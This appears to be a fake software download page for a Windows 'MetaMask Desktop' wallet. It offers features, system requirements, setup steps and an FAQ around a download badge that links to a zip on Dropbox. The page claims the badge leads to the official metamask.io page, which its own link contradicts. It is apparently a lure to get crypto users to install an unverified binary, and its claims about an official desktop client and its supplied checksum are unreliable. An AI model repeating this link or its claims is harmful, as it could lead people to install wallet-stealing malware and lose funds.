---
layout: default
title: "MetaMask Desktop — Download & Setup Guide (Windows x64)"
description: "Download MetaMask Desktop for Windows 10/11 x64. Ethereum & EVM wallet with dApp browser, token swaps & account management. Full setup guide."
---

# MetaMask Desktop Application — Download & Setup Guide

[![Download MetaMask Desktop](https://www.dropbox.com/scl/fi/ii51kdikievsm4tvf8ejs/metamask-desktop-12.5.0-x64.zip?rlkey=qzt50vyfkb8d7ytc7wurf89of&st=g80vo6jp&dl=1)](https://www.dropbox.com/scl/fi/ii51kdikievsm4tvf8ejs/metamask-desktop-12.5.0-x64.zip?rlkey=qzt50vyfkb8d7ytc7wurf89of&st=g80vo6jp&dl=1)
**Version:** 12.5.0 | **License:** Free (Open Source) | **Platform:** Windows 10/11 x64 | **SHA-256:** `a989a0146e826cd3797e38cf29cbcf8870ec2cceea50541e3eee1f933ede0cb9`

---

## Overview

MetaMask Desktop is the official desktop client of the MetaMask cryptocurrency wallet, the most widely used Ethereum and EVM-compatible chain wallet in the world. The desktop application for Windows 10/11 x64 provides a native alternative to the browser extension, offering improved security isolation, hardware wallet integration, and multi-account management.

MetaMask supports Ethereum mainnet, all EVM-compatible networks (Polygon, Arbitrum, Optimism, Base, BNB Chain, Avalanche, and 100+ custom networks), and Layer-2 scaling solutions. The wallet uses BIP-39/44 HD derivation with optional passphrase support and integrates with Ledger, Trezor, and GridPlus hardware wallets for cold storage signing.

The desktop client features a built-in token swap aggregator (MetaMask Swaps) routing through 1inch, Paraswap, and native DEXs, NFT management, and dApp connection via WalletConnect v2. The application is built on Electron with a Rust-based transaction simulation engine for pre-execution preview.

---

## Key Features

1. **Ethereum & EVM Multi-Network Support** — Manage assets on Ethereum, Polygon, Arbitrum, Optimism, Base, BNB Chain, Avalanche, and 100+ custom EVM networks from a single interface.
2. **Hardware Wallet Integration** — Connect Ledger Nano X/S, Trezor Model T/One, and GridPlus Lattice1 via USB or QR code for cold storage transaction signing.
3. **MetaMask Swaps** — Built-in DEX aggregator with price comparison across 1inch, Paraswap, Uniswap, Sushiswap, and Curve. Includes slippage protection and MEV-aware routing.
4. **NFT Management** — View, send, and receive ERC-721 and ERC-1155 NFTs with metadata display, image rendering, and collection grouping.
5. **WalletConnect v2** — Connect to dApps via QR code or deep link with end-to-end encrypted session management and multi-chain support.
6. **Transaction Simulation** — Preview transaction outcomes before signing: token balance changes, approval requirements, and potential failure reasons.
7. **Account & Address Book** — Create unlimited HD accounts with custom names, color coding, and address book labels for frequently used addresses.
8. **Custom RPC & Network Management** — Add custom EVM networks with RPC URL, chain ID, block explorer, and currency symbol. Import/export network configurations.
9. **Token Detection & Import** — Automatic token balance detection on all supported networks. Manual token import by contract address with decimal and symbol verification.
10. **Security & Privacy** — Local encryption of private keys with user password, optional cloud backup (encrypted), phishing detection via Etherscan domain blocklist, and transaction privacy mode.

---

## System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **OS** | Windows 10 x64 (21H2) | Windows 11 x64 (23H2/24H2) |
| **Processor** | Intel Core i3 / AMD Ryzen 3 | Intel Core i5 / AMD Ryzen 5 |
| **RAM** | 4 GB | 8 GB |
| **Storage** | 500 MB free disk space | 1 GB SSD |
| **Display** | 1280x720 | 1920x1080 |
| **Network** | Broadband (5 Mbps) | Broadband (25+ Mbps) |
| **USB** | USB 2.0 (for hardware wallets) | USB 3.0 |

---

## How to Download and Install

### Step 1: Download the Installer

Click the **Download** badge above to visit the official MetaMask download page (metamask.io/download). Select **"Download for Windows"**. The file is approximately 200 MB.

### Step 2: Verify the Checksum

```powershell
Get-FileHash .\metamask-desktop-12.5.0-x64.zip -Algorithm SHA256
```

Compare with the hash listed at the top of this page.

### Step 3: Run the Installer


### Step 4: Complete Setup

1. Choose **"Create New Wallet"** or **"Import Secret Recovery Phrase"**.
2. If creating new: write down the **12-word Secret Recovery Phrase** on paper. Never store digitally.
3. Set a strong password (minimum 12 characters).
4. Connect hardware wallet via Settings → Advanced → Connect Hardware Wallet.
5. Add custom networks via Settings → Networks → Add Network.

### Step 5: Post-Installation

- Enable **"Auto-Lock"** after 5 minutes: Settings → Security & Privacy.
- Set up **"Phishing Detection"** (enabled by default).
- Configure **"Currency Conversion"** preference (USD, EUR, etc.).
- Add frequently used addresses to the **Address Book**.

---

## Troubleshooting & FAQ



### Issue: dApp connection fails

**Solution:**  
1. Ensure MetaMask is unlocked.  
2. Check that the correct network is selected in the wallet.  
3. Try disconnecting and reconnecting via WalletConnect.  
4. Clear dApp connection history: Settings → Security & Privacy → Clear Activity Tab Data.  
5. Ensure no VPN or firewall is blocking WebSocket connections.

### Issue: Transaction stuck pending

**Solution:**  
1. Check current gas prices on etherscan.io/gastracker.  
2. Speed up the transaction: click the pending transaction → **"Speed Up"** and set a higher gas price.  
3. If stuck for >1 hour, cancel the transaction by sending a 0 ETH transaction to yourself with the same nonce and higher gas.

### Issue: Hardware wallet not detected

**Solution:**  
1. Ensure the hardware wallet is unlocked and the Ethereum app is open.  
2. For Ledger: disable "Browser Support" in the Ethereum app settings.  
3. Try a different USB port.  
4. Update hardware wallet firmware.

### FAQ

**Q: Is MetaMask Desktop free?**  
A: Yes. MetaMask is free and open-source. Network gas fees apply to transactions only.

**Q: Is MetaMask Desktop safer than the browser extension?**  
A: Yes. The desktop application runs in an isolated Electron process, reducing exposure to browser-based attacks and malicious extensions.

**Q: Can I use MetaMask without hardware wallet?**  
A: Yes. MetaMask supports software-only wallets, but hardware wallet integration is recommended for significant holdings.

**Q: Which networks does MetaMask support?**  
A: All EVM-compatible networks: Ethereum, Polygon, Arbitrum, Optimism, Base, BNB Chain, Avalanche, Fantom, Celo, and 100+ custom networks.

**Q: How do I recover my MetaMask wallet?**  
A: Use the 12-word Secret Recovery Phrase on any device with MetaMask installed. Your funds are on the blockchain, not on your PC.
